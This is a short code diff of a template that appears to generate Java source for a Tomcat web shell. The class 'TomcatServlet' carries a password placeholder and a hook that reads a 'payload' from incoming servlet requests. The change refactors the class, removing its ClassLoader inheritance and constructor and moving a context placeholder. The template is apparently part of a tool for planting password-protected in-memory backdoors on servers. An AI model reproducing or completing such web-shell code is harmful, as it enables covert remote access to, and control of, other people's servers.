@@ -2,13 +2,13 @@ code = """
 import java.lang.reflect.*;
 import java.util.*;
 
-public class TomcatServlet extends ClassLoader implements InvocationHandler {{
+public class TomcatServlet implements InvocationHandler {{
     private static String pattern = "*.xml";
     private static String password = "{password}";
 {common}
+{context}
 {decoder}
 {stub}
-{context}
     private void hook(Object servletRequest, Object servletResponse)
             throws Exception {{
         String payload = (String) invokeMethod(
@@ -67,10 +67,6 @@ public class TomcatServlet extends ClassLoader implements InvocationHandler {{
                 }} catch (Exception e) {{}}
             }}
         }}
-    }}
-
-    public TomcatServlet(ClassLoader loader) {{
-        super(loader);
     }}
 
     static {{
